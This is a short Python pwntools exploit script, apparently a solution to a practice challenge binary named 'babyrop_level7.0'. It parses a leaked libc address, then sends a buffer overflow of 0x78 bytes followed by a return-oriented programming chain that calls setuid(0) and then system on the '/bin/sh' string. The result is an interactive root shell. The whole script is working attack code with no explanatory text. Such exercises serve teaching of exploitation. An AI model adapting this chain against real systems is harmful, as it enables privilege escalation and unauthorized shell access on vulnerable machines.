#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('/challenge/babyrop_level7.0', checksec=False)
libc = exe.libc
# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
c
''')

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

p.recvuntil(b'is: ')
leak = int(p.recvline()[:-2], 16)
print(hex(leak))

offset = 0x16232d
pop_rdi = 0x0000000000401e13
ret = pop_rdi + 1
rw_section = 0x404320
binsh = leak + 0x16232d
setuid = leak + 0x91ec0
pl = flat(
  cyclic(0x78),
  ret,
  pop_rdi,
  0,
  setuid,
  ret,
  pop_rdi,
  binsh,
  leak,
)

p.send(pl)
p.interactive()
